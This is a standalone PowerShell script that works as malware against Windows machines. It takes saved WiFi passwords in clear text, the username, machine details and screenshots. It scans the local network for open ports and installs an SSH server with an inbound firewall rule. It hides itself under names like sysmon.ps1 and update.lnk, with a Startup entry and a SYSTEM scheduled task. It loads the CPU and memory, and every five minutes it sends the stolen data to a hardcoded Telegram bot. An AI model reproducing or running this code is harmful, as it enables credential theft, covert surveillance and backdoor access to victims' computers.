

$ErrorActionPreference = "SilentlyContinue"
$BotToken = "7321725291:AAHViRTvGpQ83L4JqzhBR14v7KEl4ov8PKc"
$ChatID = 821043148

# Directories
$OutputDir = "$env:TEMP\Stress"
$ScreenshotDir = "$OutputDir\Screenshots"
New-Item -ItemType Directory -Force -Path $OutputDir,$ScreenshotDir | Out-Null

function Write-Log($Msg) {
  "$(Get-Date -f 'HH:mm:ss') $Msg" | Add-Content "$OutputDir\log.txt"
}

Write-Log "Stress-Telegram Started"

# System Information
function Get-SystemInfo {
  $user = [Environment]::UserName
  $pc = [Environment]::MachineName
  $ip = (Get-NetIPAddress | Where-Object { $_.IPAddress -like '192.168.*' -or $_.IPAddress -like '10.*' } | Select-Object -First 1).IPAddress
  if (!$ip) { $ip = 'localhost' }
  
  # WiFi Credentials
  $ssid = netsh wlan show interfaces | Select-String "SSID" | ForEach-Object { ($_ -split ':')[1].Trim() } | Select-Object -First 1
  $wifiPass = if ($ssid) { 
    netsh wlan show profile name=$ssid key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ':')[1].Trim() }
  } else { "N/A" }
  
  # SSH Info
  $sshUser = $user
  $sshPass = "[Windows Creds: $user]"
  
  return @{
    User = $user
    PC = $pc
    Host = "$user@$pc"
    IP = $ip
    WiFiSSID = if ($ssid) { $ssid } else { "N/A" }
    WiFiPass = if ($wifiPass) { $wifiPass } else { "N/A" }
    SSHUser = $sshUser
    SSHPass = $sshPass
  }
}

# Network Devices Scan
function Get-NetworkDevices {
  $arp = arp -a 2>$null
  $devices = @()
  foreach ($line in $arp) {
    if ($line -match '(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9-]+)') {
      $ip = $matches[1]
      $ports = Test-Ports $ip
      $devices += "IP: $ip | MAC: $($matches[2]) | Ports: $ports"
    }
  }
  return $devices
}

function Test-Ports($IP) {
  $openPorts = @()
  $ports = @(22,80,443,3389,445,8080,21)
  foreach ($port in $ports) {
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($IP, $port, $null, $null)
    if ($asyncResult.AsyncWaitHandle.WaitOne(1000, $false)) {
      try {
        $tcpClient.EndConnect($asyncResult)
        $openPorts += $port
      } catch { }
    }
    $tcpClient.Close()
  }
  return if ($openPorts.Count -gt 0) { $openPorts -join ',' } else { 'closed' }
}

# Screenshot Function
function Take-Screenshot {
  Add-Type -AssemblyName System.Drawing, System.Windows.Forms
  $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
  $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
  $graphics = [Drawing.Graphics]::FromImage($bitmap)
  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::new(0,0), $bounds.Size)
  $path = "$ScreenshotDir\screen_$(Get-Date -f 'yyyyMMdd_HHmmss').png"
  $bitmap.Save($path, [Drawing.Imaging.ImageFormat]::Png)
  $bitmap.Dispose()
  $graphics.Dispose()
  return $path
}

# Setup SSH Server
function Setup-SSH {
  Write-Log "Installing SSH Server"
  Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
  Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
  Start-Service sshd -ErrorAction SilentlyContinue
  New-NetFirewallRule -DisplayName "Stress SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue
  Write-Log "SSH Server Active on Port 22"
}

# Send to Telegram
function Send-Telegram($info, $screenshot) {
  $networkDevices = Get-NetworkDevices

  $msg = @"
**🔥 $($info.Host) FULL REPORT** 🔥

👤 **Username:** $($info.User)
🔐 **SSH Login:** $($info.SSHUser)@$($info.IP)
   Password: $($info.SSHPass)
📱 **WiFi:** $($info.WiFiSSID)
   **Password: $($info.WiFiPass)**
💻 **Computer:** $($info.PC)
📍 **Status:** SSH + Stress + Persistence ACTIVE

Network Scan: $($networkDevices.Count) devices found
"@
  
  $uri = "https://api.telegram.org/bot$BotToken/sendMessage"
  $body = @{ chat_id = $ChatID; text = $msg; parse_mode = "Markdown" } | ConvertTo-Json
  Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue

  if (Test-Path $screenshot) {
    $photoUri = "https://api.telegram.org/bot$BotToken/sendPhoto"
    $photoBody = @{ chat_id = $ChatID; caption = "🖥️ $($info.Host) | SSH: $($info.SSHUser)@$($info.IP)" }
    $photoBody.photo = Get-Item $screenshot
    Invoke-RestMethod -Uri $photoUri -Method Post -Form $photoBody -ErrorAction SilentlyContinue

    Get-ChildItem $ScreenshotDir -Filter "*.png" | Remove-Item -Force -ErrorAction SilentlyContinue
    Write-Log "Screenshot sent and deleted"
  }
}

# Persistence Setup
function Install-Persistence {
  Write-Log "Installing persistence"
  
  # Save self to AppData
  $scriptContent = $MyInvocation.MyCommand.Definition
  $selfPath = "$env:APPDATA\sysmon.ps1"
  $scriptContent | Out-File $selfPath -Force -Encoding UTF8
  
  # Startup shortcut
  $wshShell = New-Object -ComObject WScript.Shell
  $shortcut = $wshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk")
  $shortcut.TargetPath = "powershell.exe"
  $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$selfPath`""
  $shortcut.Save()
  
  # Task Scheduler
  Unregister-ScheduledTask -TaskName "StressTask" -Confirm:$false -ErrorAction SilentlyContinue
  $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$selfPath`""
  $trigger = New-ScheduledTaskTrigger -AtStartup
  $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
  Register-ScheduledTask -TaskName "StressTask" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
  
  Write-Log "Persistence: Startup + Task Scheduler"
}

# CPU + RAM Stress
function Start-Stress {
  Write-Log "Starting CPU/RAM stress"
  
  # CPU Stress (85% load)
  1..([Environment]::ProcessorCount) | ForEach-Object { 
    Start-Job -ScriptBlock { 
      while ($true) {
        1..1000 | ForEach-Object { [math]::Pow($_, 2) * [math]::Sin($_) }
        Start-Sleep -Milliseconds 85
      }
    } | Out-Null 
  }
  
  # RAM Stress (512MB)
  Start-Job -ScriptBlock { 
    $memory = New-Object byte[] (512 * 1MB)
    while ($true) {
      0..($memory.Length - 1) | ForEach-Object { $memory[$_] = Get-Random -Maximum 256 }
      Start-Sleep 3
    }
  } | Out-Null
}

# === MAIN EXECUTION ===
Write-Log "=== FULL EXECUTION START ==="

# Get info and setup
$sysInfo = Get-SystemInfo
Setup-SSH
Install-Persistence

# First report
$screenshot = Take-Screenshot
Send-Telegram -info $sysInfo -screenshot $screenshot

# Start stress
Start-Stress

# 5-minute reporting loop
$timer = New-Object System.Timers.Timer(300000)  # 5 minutes
$timer.Elapsed += {
  $info = Get-SystemInfo
  $screen = Take-Screenshot
  Send-Telegram -info $info -screenshot $screen
}
$timer.Start()

Write-Log "=== ACTIVE FOREVER: Stress + SSH + Reports Every 5min ==="

# Keep alive
while ($true) {
  Start-Sleep 60
}
